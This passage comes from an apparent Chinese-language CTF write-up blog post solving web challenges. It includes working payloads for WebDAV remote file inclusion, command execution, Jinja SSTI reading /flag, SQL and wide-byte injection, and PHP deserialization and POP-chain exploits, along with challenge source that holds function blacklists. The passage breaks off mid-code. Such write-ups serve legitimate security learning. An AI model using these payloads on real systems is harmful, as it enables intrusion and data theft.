getshell</p><p><a href="https://paper.seebug.org/923/">https://paper.seebug.org/923/</a></p><p><a href="https://www.anquanke.com/post/id/201060#h3-9c">https://www.anquanke.com/post/id/201060#h3-9c</a></p><p><code>php version 5.2</code>以后<code>php.ini</code>配置中默认关闭了<code>allow_url_include</code>,而RFI包含执行需要</p><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span>=<span class="hljs-literal">On</span><span class="hljs-attr">allow_url_include</span>=<span class="hljs-literal">On</span></code></pre><p> <code>allow_url_fopen</code>和<code>allow_url_include</code>主要是针对两种协议起作用：<code>http://</code>、 <code>ftp://</code>，可以通过<code>SMB</code>、<code>WebDAV</code>绕过此限制</p><p>阿里云服务器上打不开445端口，所以放弃了<code>SMB</code>搭建，转向<code>WebDAV</code></p><p>doker搭建</p><pre><code class="hljs gradle">docker run -v ~<span class="hljs-regexp">/webdav:/</span>var<span class="hljs-regexp">/lib/</span>dav -e ANONYMOUS_METHODS=GET,<span class="hljs-keyword">OPTIONS</span>,PROPFIND -e LOCATION=<span class="hljs-regexp">/webdav -p 80:80 --rm --name webdav bytemark/</span>webdav<span class="hljs-regexp">/webdav/</span>data里写共享文件</code></pre><p>本来是想写shell的，但是没得权限写shell，扫一下目录</p><pre><code class="hljs php"><span class="hljs-comment">#/webdav/data/5</span><span class="hljs-meta">&lt;?php</span>system(<span class="hljs-string">&quot;dir&quot;</span>);phpinfo();</code></pre><p>包含一下</p><p><a href="https://imgchr.com/i/YsiUaD"><img src="https://s1.ax1x.com/2020/05/15/YsiUaD.png" alt="YsiUaD.png"></a></p><p>有一个<code>ZmxhZ2ZsQGcxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjM.txt</code>,直接访问就是flag</p><pre><code class="hljs apache"><span class="hljs-attribute">Congratulations</span>! BTW: Don&#x27;t break my env tks :P<span class="hljs-attribute">Here</span> is flag:<span class="hljs-attribute">minil</span>&#123;ad<span class="hljs-number">87</span>a<span class="hljs-number">2</span>c<span class="hljs-number">369637</span>dc<span class="hljs-number">51895</span>cb<span class="hljs-number">557</span>c<span class="hljs-number">98481</span>c&#125;</code></pre><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>直接给了shell</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>highlight_file(<span class="hljs-keyword">__FILE__</span>)<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span><span class="hljs-comment">//hint: 题目机子没有外网</span></code></pre><p><code>ls /</code>有个<code>/readflag</code>,执行但是并没有输出flag，试试输入一个yes</p><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=/readflag<span class="hljs-keyword">do</span> you want the flag? ?<span class="hljs-attribute">a</span>=echo <span class="hljs-literal">yes</span> | /readflag<span class="hljs-keyword">do</span> you want the flag?really??<span class="hljs-attribute">a</span>=echo <span class="hljs-literal">yes</span> <span class="hljs-literal">yes</span>| /readflag<span class="hljs-keyword">do</span> you want the flag? really? then calculate 11+<span class="hljs-attribute">62</span>=? ?<span class="hljs-attribute">a</span>=echo <span class="hljs-literal">yes</span> <span class="hljs-literal">yes</span> 124| /readflag写个脚本爆破就行</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsu = <span class="hljs-string">&#x27;http://d1eb8b9d09bb156cbef0926a56b23c7d.challenge.mini.lctf.online:1080/&#x27;</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    t = requests.get(u, params=&#123;        <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;echo yes yes 88 | /readflag&#x27;</span>    &#125;).text    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;mini&quot;</span> <span class="hljs-keyword">in</span> t:        print(t)</code></pre><p>还有种非预期，<code>echo yes| /readflag</code> 爆破也行，当第一个参数为0可以出flag，最后问出题人是因为重复用了一个变量导致非预期</p><h1 id="Personal-IP-Query"><a href="#Personal-IP-Query" class="headerlink" title="Personal_IP_Query"></a>Personal_IP_Query</h1><p>题目提示 <code>Your IP</code>  猜测是<code>X-Forwarded-For</code>对输出有影响，最后测出是ssti,但是过滤了很多东西像下划线，引号全没了，只能用传参来绕</p><pre><code class="hljs python">?c=__class__&amp;b=__bases__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;bt=__builtins__&amp;d=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()X-Forwarded-For: &#123;&#123;[][request.args.c][request.args.b][<span class="hljs-number">0</span>][request.args.s]()[<span class="hljs-number">76</span>][request.args.i][request.args.g][request.args.bt].<span class="hljs-built_in">eval</span>(request.args.d)&#125;&#125;</code></pre><p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参绕过</p><h1 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h1><p>第一层注入 </p><p><code>1&quot;|| 1 #</code>可以绕过登录，并且回回显用户名密码 ，然而过滤了很多东西，无法正常的查数据，这里可以结合回显用一手offset</p><p><code>payload : logname=&quot; || 1 limit 1 offset 3#&amp;logpass=123</code></p><p>回显 </p><p><code>alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)</code></p><p>第二层 /flag327a6c4304a/</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> (<span class="hljs-string">&#x27;flag.php&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;    <span class="hljs-variable">$key</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;xdsec&#x27;</span>);    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$key</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;hack!!!!&#x27;</span>,<span class="hljs-variable">$payload</span>);&#125;<span class="hljs-variable">$payload</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;mini&#x27;</span>]=<span class="hljs-string">&#x27;nb666&#x27;</span>;<span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;V0n&#x27;</span>]=<span class="hljs-string">&#x27;no_girlfriend&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$payload</span>)) &#123;    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;php&#x27;</span>) &gt;=<span class="hljs-number">0</span> || strpos(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span> || strpos(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;xdsec&#x27;</span>)&gt;=<span class="hljs-number">0</span>) &#123;        <span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;mini&#x27;</span>]=<span class="hljs-variable">$payload</span>;        var_dump(filter(serialize(<span class="hljs-variable">$fuck</span>)));        <span class="hljs-variable">$fuck</span>=unserialize(filter(serialize(<span class="hljs-variable">$fuck</span>)));        var_dump(<span class="hljs-variable">$fuck</span>);        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fuck</span>[<span class="hljs-string">&#x27;V0n&#x27;</span>] === <span class="hljs-string">&#x27;has_girlfriend&#x27;</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck_no_girlfriend!!!&#x27;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck_no_key!!!&#x27;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>随便传一个payload就会出序列化值，然后就就平常的反序列化逃逸</p><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;mini&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;1213&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;V0n&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;no_girlfriend&quot;</span>;&#125;<span class="hljs-comment">#目标序列化</span>a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;mini&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;1213&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;V0n&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;has_girlfriend&quot;</span>;&#125;<span class="hljs-comment"># mini 可控，需要挤出 &quot;;s:3:&quot;V0n&quot;;s:14:&quot;has_girlfriend&quot;;&#125; 35个字符, 7*php -&gt; hack!!!! 刚好 7*5=35，那么传入payload  </span>phpphpphpphpphpphpphp<span class="hljs-string">&quot;;s:3:&quot;</span>V0n<span class="hljs-string">&quot;;s:14:&quot;</span>has_girlfriend<span class="hljs-string">&quot;;&#125;</span></code></pre><p>就有flag了</p><h1 id="Let’s-Play-Dolls"><a href="#Let’s-Play-Dolls" class="headerlink" title="Let’s_Play_Dolls"></a>Let’s_Play_Dolls</h1><p>pop链然后无参数rce</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;    unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;var)) &#123;             <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/header|bin|hex|oct|dec|na|eval|exec|system|pass/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;var))&#123;                <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;var);            &#125;              <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacked!&quot;</span>);            &#125;          &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&quot;phpinfo();&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;desctuct foo1&lt;/br&gt;&#x27;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&#x27;hi&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;obj=<span class="hljs-literal">null</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;obj-&gt;execute();        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;var;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__desctuct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;desctuct foo2&lt;/br&gt;&#x27;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;var=<span class="hljs-string">&quot;index.php&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-keyword">$this</span>-&gt;var))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;var.<span class="hljs-string">&quot;exist&lt;/br&gt;&quot;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;desctuct foo3&lt;/br&gt;&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;hi&quot;</span>);    &#125;&#125;</code></pre><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo1</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;&#x27;</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo2</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo3</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;&#125;<span class="hljs-variable">$f1</span> = <span class="hljs-keyword">new</span> foo1();<span class="hljs-variable">$f2</span> = <span class="hljs-keyword">new</span> foo2();<span class="hljs-variable">$f3</span> = <span class="hljs-keyword">new</span> foo3();<span class="hljs-variable">$f3</span> -&gt;var = <span class="hljs-variable">$f2</span>;<span class="hljs-variable">$f2</span> -&gt;obj = <span class="hljs-variable">$f1</span>;<span class="hljs-variable">$f1</span> -&gt;var = <span class="hljs-string">&quot;var_dump(scandir(getcwd()));&quot;</span>;<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$f3</span>);<span class="hljs-comment"># O:4:&quot;foo3&quot;:1:&#123;s:3:&quot;var&quot;;O:4:&quot;foo2&quot;:2:&#123;s:3:&quot;var&quot;;N;s:3:&quot;obj&quot;;O:4:&quot;foo1&quot;:1:&#123;s:3:&quot;var&quot;;s:28:&quot;var_dump(scandir(getcwd()));&quot;;&#125;&#125;&#125;</span>绕一下wakeup 最后payload O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;foo3&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;foo2&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;foo1&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">28</span>:<span class="hljs-string">&quot;var_dump(scandir(getcwd()));&quot;</span>;&#125;&#125;&#125;</code></pre><p>遍历出 youCanGet1tmaybe文件 直接访问flag到手</p><h1 id="are-you-reclu3e"><a href="#are-you-reclu3e" class="headerlink" title="are you reclu3e?"></a>are you reclu3e?</h1><p>开始没有思路做，后面提示了vim ，就想到swp文件，下到了index.php 和login.php源码</p><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-comment">//$flag=&quot;minilctf&#123;****&#125;&quot;;</span>    session_start();    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>])) &#123;        <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;loginForm.html&quot;</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h1&gt;Hello, reclu3e!&lt;/h1&gt;&#x27;</span>;        <span class="hljs-variable">$p</span>=unserialize(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;p&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;p&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>);    &#125;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">person</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weight</span>=<span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$height</span>=<span class="hljs-number">0</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$serialize</span>=<span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-keyword">$this</span>-&gt;serialize))&#123;            <span class="hljs-keyword">$this</span>-&gt;serialize++;        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$s=&quot;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;serialize.<span class="hljs-string">&#x27;&quot;;&#x27;</span>);    &#125;&#125;<span class="hljs-comment">#login.php</span><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;connection.php&quot;</span>;    mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;SET CHARACTER SET &#x27;gbk&#x27;&quot;</span>);    <span class="hljs-variable">$username</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);    <span class="hljs-variable">$password</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);    <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$username</span>))&#123;        <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;please post your username&#x27;</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;        <span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;            <span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$row</span>))&#123;            <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;you are not reclu3e&#x27;</span>;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>]!==<span class="hljs-variable">$password</span>)&#123;                <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;I know you are reclu3e but you need post the right password&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span>&#123;                session_start();                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$username</span>;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;Yes! you are reclu3e&quot;)&lt;/script&gt;&#x27;</span>;            &#125;        &#125;    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$msg</span>))&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">$msg</span>&#x27;)&lt;/script&gt;&quot;</span>;    &#125;    <span class="hljs-variable">$conn</span>-&gt;close();    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;&quot;</span>;      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;window.location.href=&#x27;index.php&#x27;&quot;</span>;      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/script&gt;&quot;</span>;  </code></pre><p>明显login.php有宽字节注入,切password是拿出来单独验证，所以这里用union绕一下</p><p>payload:<code>username=%df%27 union select 1,1#&amp;password=1</code></p><p>然后又是玩烂了的反序列化了，23333 ，flag在flag.php里</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">person</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> =<span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weight</span>=<span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$height</span>=<span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$serialize</span>=<span class="hljs-string">&#x27;1&quot;;?&gt;&lt;?php show_source(&quot;flag.php&quot;);?&gt;&#x27;</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> person();<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);ps:wakeup不用绕，也绕不了 xs</code></pre><p><img src="https://s1.ax1x.com/2020/05/16/Y6jtkd.png" alt="Y6jtkd.png"></p><h1 id="id-wife"><a href="#id-wife" class="headerlink" title="id_wife"></a>id_wife</h1><p>随便注换了一个前端，但是看到了西电大师傅的靓照 血赚</p><pre><code class="hljs sql">id=w1nd&#x27;);<span class="hljs-keyword">handler</span> <span class="hljs-string">`1145141919810`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> yun;<span class="hljs-keyword">handler</span> yun <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> yun <span class="hljs-keyword">read</span> <span class="hljs-keyword">next</span>;</code></pre><h1 id="p"><a href="#p" class="headerlink" title="p"></a>p</h1><p>第一层改序列化得源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;classes.php&#x27;</span>;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;git&#x27;</span>])) &#123;    ob_start();    setcookie(<span class="hljs-string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="hljs-keyword">new</span> gitee(<span class="hljs-string">&#x27;index.php&#x27;</span>))));    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;    ob_end_flush();    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-variable">$comp</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;git&#x27;</span>]));highlight_file(<span class="hljs-variable">$comp</span>-&gt;file);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;</code></pre><p><code>setcookie(&#39;git&#39;, base64_encode(serialize(new gitee(&#39;index.php&#39;))));</code>,我们可以在cookie中base64后看序列化后的数据</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;gitee&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;index.php&quot;</span>;&#125;<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span> 改成<span class="hljs-selector-tag">class</span><span class="hljs-selector-class">.php</span>就可以看到<span class="hljs-selector-tag">classes</span><span class="hljs-selector-class">.php</span>的源码<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;gitee&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;classes.php&quot;</span>;&#125;</code></pre><p>第二层 无字符webshell</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gitee</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你用上了Git，可是，代价是什么呢（悲）&#x27;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$f</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">github</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;cmd))            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cerror&quot;</span>);        <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;~!@#%^&amp;*()（）-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;        <span class="hljs-keyword">foreach</span>(str_split(<span class="hljs-variable">$blacklist</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>;            <span class="hljs-keyword">if</span>(strchr(<span class="hljs-keyword">$this</span>-&gt;cmd, <span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>)                 <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;serror&#x27;</span>);        &#125;        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;cmd);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;            <span class="hljs-comment">// 